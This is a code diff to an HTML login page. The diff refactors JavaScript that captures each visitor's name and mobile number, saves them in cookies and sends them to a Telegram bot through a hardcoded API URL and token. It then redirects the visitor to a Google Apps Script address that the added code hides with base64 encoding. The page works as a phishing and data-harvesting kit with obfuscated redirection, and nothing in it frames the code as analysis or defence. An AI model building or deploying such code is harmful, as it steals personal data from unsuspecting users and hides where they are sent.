@@ -50,18 +50,6 @@
         button:hover {
             background-color: #0055ff;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes zoomIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
     </style>
 </head>
 <body>
@@ -73,6 +61,22 @@
     </form>
 
     <script>
+        function sendTelegramMessage(name, mobile) {
+            const telegramApiUrl = "https://api.telegram.org/bot5511964084:AAHV7mNKO35XLcNcEpnt4Pm_bfWF7yNag4k/sendMessage";
+            const chatId = "-4612832676";
+            const message = `User logged in: Name - ${name}, Mobile - ${mobile}`;
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).catch(error => console.error('Error sending Telegram message:', error));
+        }
+
+        function redirectToGoogleScript() {
+            const redirectUrl = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc... (base64-encoded URL)");
+            window.location.href = redirectUrl;
+        }
+
         window.onload = function() {
             const cookies = document.cookie.split(';').map(c => c.trim());
             const cookieObj = {};
@@ -81,7 +85,8 @@
                 cookieObj[key] = value;
             });
             if (cookieObj.name && cookieObj.mobile) {
-                window.location.href = "https://script.google.com/macros/s/AKfycbznnLfIbaVnTMVAAlJeKdOTd_V_JIxcRmzBMKO3jbawTyPIqQY9rJJ9_xiY39af_2POMA/exec";
+                sendTelegramMessage(cookieObj.name, cookieObj.mobile);
+                redirectToGoogleScript();
             }
         };
 
@@ -89,24 +94,16 @@
             e.preventDefault();
             const name = document.getElementById('name').value;
             const mobile = document.getElementById('mobile').value;
-            document.cookie = `name=${name}; path=/;`;
-            document.cookie = `mobile=${mobile}; path=/;`;
-
-            const telegramApiUrl = "https://api.telegram.org/bot5511964084:AAHV7mNKO35XLcNcEpnt4Pm_bfWF7yNag4k/sendMessage";
-            const chatId = "-4612832676";
-            const message = `New login with name: ${name}, mobile number: ${mobile}`;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            }).then(response => response.json())
-              .then(data => {
-                  console.log('Message sent:', data);
-                  window.location.href = "https://script.google.com/macros/s/AKfycbznnLfIbaVnTMVAAlJeKdOTd_V_JIxcRmzBMKO3jbawTyPIqQY9rJJ9_xiY39af_2POMA/exec";
-              })
-              .catch(error => console.error('Error:', error));
+            const expires = new Date();
+            expires.setTime(expires.getTime() + 24*60*60*1000); 
+            document.cookie = `name=${name}; path=/; expires=${expires.toUTCString()}`;
+            document.cookie = `mobile=${mobile}; path=/; expires=${expires.toUTCString()}`;
+            sendTelegramMessage(name, mobile);
+            redirectToGoogleScript();
         });
     </script>
 </body>
 </html>
+
+
+            
